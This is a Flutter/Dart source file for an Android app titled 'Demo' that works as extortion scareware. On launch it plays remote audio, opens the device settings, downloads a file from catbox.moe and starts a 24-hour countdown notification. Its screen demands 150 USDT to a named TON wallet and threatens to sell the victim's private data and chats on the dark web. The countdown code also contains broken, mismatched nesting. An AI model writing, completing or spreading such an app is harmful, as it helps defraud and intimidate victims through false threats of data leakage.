import 'dart:async';
import 'dart:io';
  
import 'package:flutter/material.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:android_intent_plus/android_intent.dart';
import 'package:dio/dio.dart';
import 'package:path_provider/path_provider.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Demo',
      home: SplashScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class SplashScreen extends StatefulWidget {
  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  final AudioPlayer player = AudioPlayer();
  final FlutterLocalNotificationsPlugin notificationsPlugin =
      FlutterLocalNotificationsPlugin();
  Timer? countdownTimer;
  int secondsLeft = 86400; // 24 ساعة

  @override
  void initState() {
    super.initState();
    _initNotifications();
    _startCountdown();
    _downloadFile();

    // شغّل صوت البداية
    player.play(UrlSource('https://files.catbox.moe/bkz6o8.mp3'));

    // بعد 5 ثوانٍ، افتح الإعدادات
    Timer(Duration(seconds: 5), () {
      final intent = AndroidIntent(action: 'android.settings.SETTINGS');
      intent.launch();
    });
  }

  void _initNotifications() async {
    const AndroidInitializationSettings androidSettings =
        AndroidInitializationSettings('@mipmap/ic_launcher');

    const InitializationSettings settings =
        InitializationSettings(android: androidSettings);

    await notificationsPlugin.initialize(settings);
  }

  void _showNotification(String timeLeft) async {
    const AndroidNotificationDetails androidDetails =
        AndroidNotificationDetails(
      'timer_channel',
      'Timer Channel',
      importance: Importance.high,
      priority: Priority.high,
      ongoing: true,
      showWhen: false,
    );

    const NotificationDetails generalNotificationDetails =
        NotificationDetails(android: androidDetails);

    await notificationsPlugin.show(
      0,
      'Countdown Timer',
      'Time left: $timeLeft',
      generalNotificationDetails,
    );
  }

  void _startCountdown() {
    countdownTimer = Timer.periodic(Duration(seconds: 1), (_) async {
      if (secondsLeft > 0) {
        secondsLeft--;
        final time = _formatDuration(secondsLeft);
        _showNotification(time);
  Timer.periodic(Duration(seconds: 1), (timer) async {
           await player.stop();
        await player.play(UrlSource('https://files.catbox.moe/rmxn9r.mp3'));
      } else {
        countdownTimer?.cancel();
      }
    });
  }

  String _formatDuration(int seconds) {
    final d = Duration(seconds: seconds);
    return d.toString().split('.').first.padLeft(8, "0");
  }

  void _downloadFile() async {
    try {
      final dio = Dio();
      final dir = await getApplicationDocumentsDirectory();
      final filePath = '${dir.path}/sample.pdf';

      await dio.download(
        'https://files.catbox.moe/omhyos.pdf',
        filePath,
      );

      print('Downloaded to: $filePath');
    } catch (e) {
      print('Error downloading file: $e');
    }
  }

  @override
  void dispose() {
    countdownTimer?.cancel();
    player.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Stack(
      children: [
        Positioned.fill(
          child: Image.network(
            'https://wallpapers.com/images/hd/black-solid-background-1024-x-1365-r5a0xmfri40gdznl.jpg',
            fit: BoxFit.cover,
          ),
        ),
        Center(
          child: Text(
            "Hi bro, don't worry, nothing has happened yet, but you have 24 hours to send 150 USDT to this crypto wallet, or we will send all your privte data and chats and your perosnal informations to our store in darkweb. Send the money on this (ton) network and the address is: UQB7wop5BmicB85_eiv_azfZVFwlFUsrULNpCbSvScjpHigE  An important note: Even if you delete the application, your information is stored in our database and nothing will change.",
            style: TextStyle(
              color: Colors.green,
              fontSize: 12,
              fontWeight: FontWeight.bold,
            ),
          ),
        ),
      ],
    );
  }
}
